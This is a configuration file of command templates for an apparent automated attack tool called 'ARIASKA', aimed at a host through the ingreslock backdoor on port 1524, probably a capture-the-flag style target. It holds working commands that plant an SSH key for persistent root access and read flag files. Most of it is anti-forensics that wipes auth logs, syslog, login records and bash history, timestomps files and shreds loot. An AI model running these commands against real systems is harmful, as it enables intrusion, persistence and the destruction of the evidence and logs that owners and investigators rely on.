network_config_dump.template: ifconfig 2>/dev/null || ip addr && ip route && cat /etc/resolv.conf
network_config_dump.description: Dump network configuration for internal network mapping.

ssh_key_harvest.description: Find SSH private keys for lateral movement.

cleanup_logs.description: Clear system logs and bash history to cover tracks.

timestomp.description: Modify file timestamps to match reference file (anti-forensics).

dump_shadow.description: Dump /etc/shadow for password hashes via ingreslock backdoor.

dump_passwd.description: Dump /etc/passwd to enumerate all system users via ingreslock.

plant_ssh_key.template: { echo 'mkdir -p /root/.ssh && echo ssh-rsa_AAAA_ariaska_key >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && echo PERSISTENCE_OK'; sleep 2; } | timeout 10 telnet {target} 1524
plant_ssh_key.description: Plant SSH authorized key for persistent root access via ingreslock.

read_user_flag.template: cat /home/*/user.txt 2>/dev/null || find / -name user.txt -readable 2>/dev/null | head -3 | xargs cat 2>/dev/null

read_root_flag.template: cat /root/root.txt 2>/dev/null || find / -name root.txt -readable 2>/dev/null | head -3 | xargs cat 2>/dev/null

remove_uploaded_tools.template: { echo 'find /tmp /dev/shm /var/tmp -newer /etc/passwd -type f -exec rm -f {} \; 2>/dev/null && echo CLOSEOUT_TOOLS_REMOVED'; sleep 2; } | timeout 10 telnet {target} 1524
remove_uploaded_tools.description: Remove attack tools we uploaded to temp directories. Undo our artifacts.

remove_ssh_keys_planted.template: { echo 'sed -i "/attacker/d" /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2>/dev/null && echo CLOSEOUT_KEYS_REMOVED'; sleep 2; } | timeout 10 telnet {target} 1524
remove_ssh_keys_planted.description: Remove SSH keys we planted in authorized_keys. Undo our persistence.

remove_cron_backdoors.template: { echo 'crontab -r 2>/dev/null; find /var/spool/cron -newer /etc/passwd -exec rm -f {} \; && echo CLOSEOUT_CRON_REMOVED'; sleep 2; } | timeout 10 telnet {target} 1524
remove_cron_backdoors.description: Remove cron-based persistence we installed. Undo our scheduled tasks.

verify_target_stable.template: { echo 'uptime && ps aux | wc -l && df -h / | tail -1 && echo TARGET_STABLE_VERIFIED'; sleep 2; } | timeout 10 telnet {target} 1524
verify_target_stable.description: Verify target system is stable after our engagement. Check uptime, processes, disk.

cleanup_tmp_artifacts.template: { echo 'rm -f /tmp/ariaska_* /tmp/payload_* /tmp/exploit_* /dev/shm/.* 2>/dev/null && echo CLOSEOUT_TMP_CLEANED'; sleep 2; } | timeout 10 telnet {target} 1524
cleanup_tmp_artifacts.description: Remove temporary artifacts created during engagement from /tmp and /dev/shm.

clear_bash_history.template: { echo 'cat /dev/null > ~/.bash_history && history -c && echo CLOSEOUT_HISTORY_CLEARED'; sleep 2; } | timeout 10 telnet {target} 1524
clear_bash_history.description: Clear bash command history to remove evidence of executed commands.

clear_auth_logs.template: { echo 'cat /dev/null > /var/log/auth.log && cat /dev/null > /var/log/secure 2>/dev/null && echo CLOSEOUT_AUTH_CLEARED'; sleep 2; } | timeout 10 telnet {target} 1524
clear_auth_logs.description: Clear authentication logs (auth.log, secure) to remove login evidence.

clear_wtmp_btmp.template: { echo 'cat /dev/null > /var/log/wtmp && cat /dev/null > /var/log/btmp && cat /dev/null > /var/log/lastlog && echo CLOSEOUT_LOGIN_LOGS_CLEARED'; sleep 2; } | timeout 10 telnet {target} 1524
clear_wtmp_btmp.description: Clear wtmp/btmp/lastlog to remove login session records.

shred_sensitive_files.template: { echo 'shred -vfz -n 3 /tmp/loot* /tmp/dump* /tmp/*.tar.gz 2>/dev/null && echo CLOSEOUT_FILES_SHREDDED'; sleep 2; } | timeout 10 telnet {target} 1524
shred_sensitive_files.description: Securely shred (overwrite+delete) any sensitive files left behind.

timestomp_closeout.template: { echo 'find /tmp /var/tmp /dev/shm -newer /etc/hostname -exec touch -r /etc/hostname {{}} \; 2>/dev/null && echo CLOSEOUT_TIMESTAMPS_FIXED'; sleep 2; } | timeout 10 telnet {target} 1524
timestomp_closeout.description: Reset timestamps on modified files to blend with original system files.

clear_syslog.template: { echo 'cat /dev/null > /var/log/syslog && cat /dev/null > /var/log/messages 2>/dev/null && echo CLOSEOUT_SYSLOG_CLEARED'; sleep 2; } | timeout 10 telnet {target} 1524
clear_syslog.description: Clear system logs (syslog, messages) to remove activity traces.

remove_known_hosts.template: { echo 'rm -f ~/.ssh/known_hosts /root/.ssh/known_hosts /home/*/.ssh/known_hosts 2>/dev/null && echo CLOSEOUT_KNOWN_HOSTS_REMOVED'; sleep 2; } | timeout 10 telnet {target} 1524
remove_known_hosts.description: Remove SSH known_hosts entries that record our connections.

generate_report.template: { echo '=== ARIASKA ENGAGEMENT REPORT ==='; echo 'Target: {target}'; echo 'Status: CLOSEOUT COMPLETE'; echo 'Artifacts removed: YES'; echo 'Logs cleared: YES'; echo 'Target stable: VERIFIED'; echo 'REPORT_GENERATED'; sleep 2; } | timeout 10 telnet {target} 1524
generate_report.description: Generate final engagement report. This marks the CLOSEOUT phase as COMPLETE.
